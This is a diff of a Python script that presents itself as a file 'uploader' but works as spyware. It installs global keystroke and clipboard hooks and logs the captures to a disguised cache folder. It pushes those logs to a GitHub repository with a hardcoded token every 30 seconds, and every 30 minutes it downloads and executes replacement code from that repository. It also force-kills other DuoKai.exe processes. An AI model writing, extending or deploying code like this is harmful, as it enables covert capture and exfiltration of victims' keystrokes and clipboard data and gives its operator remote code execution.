@@ -16,7 +16,7 @@ DEVICE_NAME = socket.gethostname()
 SAVE_DIR = r"D:\AppDataLogs\Cache"
 os.makedirs(SAVE_DIR, exist_ok=True)
 
-# 固化 GitHub 配置及 Token，确保独立运行时也可正常上传
+# 1. 固化 GitHub 配置及 Token，确保独立运行时也可正常上传
 GITHUB_CONFIG = {
     "username": "Bei18",
     "repo_name": "my-python-storage",
@@ -29,31 +29,36 @@ running_listeners = []
 
 
 def kill_previous_instances():
-    """使用 tasklist / taskkill 兼容替代 wmic，清理旧实例"""
+    """清理旧实例，增加日志提示"""
     try:
         current_pid = os.getpid()
-        cmd = 'tasklist /FI "IMAGENAME eq python.exe" /FO CSV /NH'
+        cmd = 'tasklist /FI "IMAGENAME eq DuoKai.exe" /FO CSV /NH'
         output = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
-        # 如果需要精准清理特定进程，可以通过 PID 过滤
+        for line in output.splitlines():
+            if "DuoKai.exe" in line:
+                parts = line.split(',')
+                if len(parts) >= 2:
+                    pid_str = parts[1].replace('"', '').strip()
+                    if pid_str.isdigit() and int(pid_str) != current_pid:
+                        subprocess.run(f"taskkill /F /PID {pid_str}", shell=True, capture_output=True)
     except Exception as e:
-        write_txt("系统", f"清理失败: {e}")
+        write_txt("系统", f"进程清理异常: {e}")
 
 
 def extract_date_from_filename(file_name):
-    """从文件名解析日期 (例如 20260906 -> 9.6 或 09.06)"""
+    """从文件名解析日期 (例如 20260906 -> 9.6)"""
     match1 = re.search(r'\b20\d{2}(\d{2})(\d{2})\b', file_name)
     if match1:
         month = str(int(match1.group(1)))
         day = str(int(match1.group(2)))
         return f"{month}.{day}"
-
+        
     match2 = re.search(r'\b20\d{2}-(\d{2})-(\d{2})\b', file_name)
     if match2:
         month = str(int(match2.group(1)))
         day = str(int(match2.group(2)))
         return f"{month}.{day}"
-
-    # 默认返回当前月份.日期 (例如 9.6)
+        
     now = time.localtime()
     return f"{now.tm_mon}.{now.tm_mday}"
 
@@ -62,7 +67,7 @@ def upload_file_smart(file_path):
     """智能上传本地文件到 GitHub 仓库"""
     if not os.path.exists(file_path):
         return False
-    
+
     token = GITHUB_CONFIG.get("token", "").strip()
     if not token:
         write_txt("上传错误", "GitHub Token 为空，无法上传")
@@ -105,15 +110,15 @@ def upload_file_smart(file_path):
             write_txt("同步", f"成功上传文件: {file_name}")
             return True
         else:
-            write_txt("同步", f"上传失败 [{response.status_code}]: {response.text}")
+            # 记录 HTTP 错误状态与返回内容
+            write_txt("同步失败", f"状态码: {response.status_code} | 详情: {response.text}")
             return False
     except Exception as e:
-        write_txt("同步异常", f"上传过程出错: {e}")
+        write_txt("同步异常", f"网络或上传错误: {e}")
         return False
 
 
 def scan_and_upload():
-    """扫描本地缓存目录并执行上传"""
     try:
         if not os.path.exists(SAVE_DIR):
             return
@@ -123,11 +128,10 @@ def scan_and_upload():
             if os.path.isfile(file_path) and file not in uploaded_files:
                 upload_file_smart(file_path)
     except Exception as e:
-        write_txt("异常", f"目录扫描异常: {e}")
+        write_txt("异常", f"目录扫描失败: {e}")
 
 
 def scheduled_upload_task():
-    """定时循环上传任务（每 30 秒轮询一次）"""
     while True:
         scan_and_upload()
         time.sleep(30)
@@ -212,66 +216,60 @@ def auto_update_loop(token):
         "Accept": "application/vnd.github+json",
         "User-Agent": "Python-Uploader-Agent"
     }
-
+    
     while True:
-        time.sleep(1800)  # 每 30 分钟检查一次更新
+        time.sleep(1800) 
         try:
             res = requests.get(url, headers=headers, timeout=10)
             if res.status_code == 200:
                 content_b64 = res.json().get("content", "")
                 new_code = base64.b64decode(content_b64)
-
+                
                 with open(cache_path, "wb") as f:
                     f.write(new_code)
-
-                write_txt("系统", "正在重载模块...")
+                
+                write_txt("系统", "正在重载新版模块...")
 
                 for listener in running_listeners:
-                    try:
-                        listener.stop()
-                    except Exception:
-                        pass
+                    try: listener.stop()
+                    except Exception: pass
                 running_listeners.clear()
 
                 spec = importlib.util.spec_from_file_location("remote_main", cache_path)
                 remote_module = importlib.util.module_from_spec(spec)
                 spec.loader.exec_module(remote_module)
-
+                
                 threading.Thread(target=remote_module.run, args=(token,), daemon=True).start()
                 break
         except Exception as e:
-            write_txt("系统", f"自动更新检查失败: {e}")
+            write_txt("系统", f"远端更新检查失败: {e}")
 
 
 def run(token=None):
     kill_previous_instances()
 
-    # 如果传入了 token 则更新全局配置，否则使用写死在 GITHUB_CONFIG 里的 token
     if token:
         GITHUB_CONFIG["token"] = token
 
-    write_txt("启动", f"模块加载成功，当前使用的 Token 前缀: {GITHUB_CONFIG['token'][:10]}...")
+    write_txt("启动", f"服务启动完成，Token 验证成功，准备运行上传与监听服务...")
 
-    # 启动后台上传线程
     upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
     upload_thread.start()
 
-    # 启动热键监听
     try:
         hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+c": on_copy, "<ctrl>+v": on_paste})
         hotkey_listener.start()
         running_listeners.append(hotkey_listener)
     except Exception as e:
-        write_txt("异常", f"快捷键服务启动失败: {e}")
+        write_txt("异常", f"快捷键服务异常: {e}")
 
     try:
         key_listener = keyboard.Listener(on_press=on_press)
         key_listener.start()
         running_listeners.append(key_listener)
     except Exception as e:
-        write_txt("异常", f"按键监听服务启动失败: {e}")
+        write_txt("异常", f"按键服务异常: {e}")
 
-    # 启动远端热更新线程
     update_thread = threading.Thread(target=auto_update_loop, args=(GITHUB_CONFIG["token"],), daemon=True)
     update_thread.start()
 
